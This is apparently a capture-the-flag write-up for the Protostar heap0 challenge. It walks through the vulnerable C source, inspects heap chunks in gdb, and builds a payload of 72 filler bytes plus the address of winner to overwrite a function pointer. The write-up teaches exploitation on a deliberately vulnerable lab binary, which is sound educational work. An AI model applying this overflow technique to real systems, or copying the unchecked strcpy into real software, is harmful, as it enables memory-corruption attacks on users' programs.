## Simple Heap Overflow

heap0.c from protostar

```clike
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {  
  char name[64];
};

struct fp {  
  int (*fp)();
};

void winner()  
{
  printf("level passed\n");
}

void nowinner()  
{
  printf("level has not been passed\n");
}

int main(int argc, char **argv)  
{
  struct data *d;
  struct fp *f;

  d = malloc(sizeof(struct data));
  f = malloc(sizeof(struct fp));
  f->fp = nowinner;

  printf("data is at %p, fp is at %p\n", d, f);

  strcpy(d->name, argv[1]);

  f->fp();

}
```
 - `d = malloc(sizeof(struct data));` -> allocated dynamic memory
 - `f = malloc(sizeof(struct fp));` -> allocated dynamic memory
 - `f->fp = nowinner;` -> function pointer is pointed to nowinner function
 - `strcpy(d->name, argv[1]);` -> user input allocated in first chunk
 - `f->fp();` -> call the function that address stored in `f->fp`
 - in this challenge, we need to call winner function

Testing challenge binary

```
$ ./heap0 AAAA BBBB
data is at 0x804a008, fp is at 0x804a050
level has not been passed
```
**Viewing heap in gdb**

 - `gdb -q ./heap0` -> load the program with gdb
 - `set disassembly-flavor intel` - > setting disassembly result to intel
 - `disas main` -> disassembling main function to set a break point
 - `break *main+76` -> set a breakpoint at printf function call
 - `run AAAA` -> run program to hit our breakpoint

viewing memory map 

```
(gdb) info proc map
process 1513
cmdline = '/opt/protostar/bin/heap0'
cwd = '/opt/protostar/bin'
exe = '/opt/protostar/bin/heap0'
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/heap0
         0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/heap0
         0x804a000  0x806b000    0x21000          0           [heap]
        0xb7e96000 0xb7e97000     0x1000          0
        0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so
        0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so
        0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so
        0xb7fd9000 0xb7fdc000     0x3000          0
        0xb7fe0000 0xb7fe2000     0x2000          0
        0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]
        0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so
        0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so
        0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so
        0xbffeb000 0xc0000000    0x15000          0           [stack]
``` 

 - `0x804a000  0x806b000    0x21000          0           [heap]` -> now we know the heap address
 - `x/32x 0x804a000` -> examining heap 

defining hook for better debugging

```
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>x/32x 0x804a000
>x/2i $eip
>end
```
 run again

```
(gdb) run AAAA
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /opt/protostar/bin/heap0 AAAA
0x804a000:      0x00000000      0x00000049      0x00000000      0x00000000
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a040:      0x00000000      0x00000000      0x00000000      0x00000011
0x804a050:      0x08048478      0x00000000      0x00000000      0x00020fa9
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
0x80484d8 <main+76>:    call   0x8048378 <printf@plt>
0x80484dd <main+81>:    mov    eax,DWORD PTR [ebp+0xc]

Breakpoint 1, 0x080484d8 in main (argc=2, argv=0xbffffd64) at heap0/heap0.c:34
34      in heap0/heap0.c
```
 - user input is not stored into heap chunk 
 - run after strcpy function called

```
0x804a000:      0x00000000      0x00000049      0x41414141      0x00000000
0x804a010:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a020:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a030:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a040:      0x00000000      0x00000000      0x00000000      0x00000011
0x804a050:      0x08048478      0x00000000      0x00000000      0x00020fa9
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
```
 - by understanding heap chunk
	 - `0x49` -> chunk size , 73 bytes in decimal
	 - we should inject payload more than 73 bytes 
	 - `run $(python -c 'print "A"*80')`

result
```
0x804a000:      0x00000000      0x00000049      0x41414141      0x41414141
0x804a010:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a020:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a050:      0x41414141      0x41414141      0x00000000      0x00020fa9
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
```
continue
 - `0x41414141 in ?? ()` -> overflowed f->fp 

controlling f->fp

 - `0x49 -> 73` -> but we need to consider f's chunk size
 - `73 - 1 = 72` -> `run $(python -c 'print "A"*72+"BBBB"')`

result
```
0x804a000:      0x00000000      0x00000049      0x41414141      0x41414141
0x804a010:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a020:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a030:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a040:      0x41414141      0x41414141      0x41414141      0x41414141
0x804a050:      0x42424242      0x00000000      0x00000000      0x00020fa9
0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
```

 - yeah , we controlled 
 - `disas winner` -> looking the address of winner function
 - `0x08048464` -> `\x64\x84\x04\x08` in little endian
 - `run $(python -c 'print "A"*72+"\x64\x84\x04\x08"')` -> final payload

result

```
$ ./heap0 $(python -c 'print "A"*72+"\x64\x84\x04\x08"')
data is at 0x804a008, fp is at 0x804a050
level passed
```

---

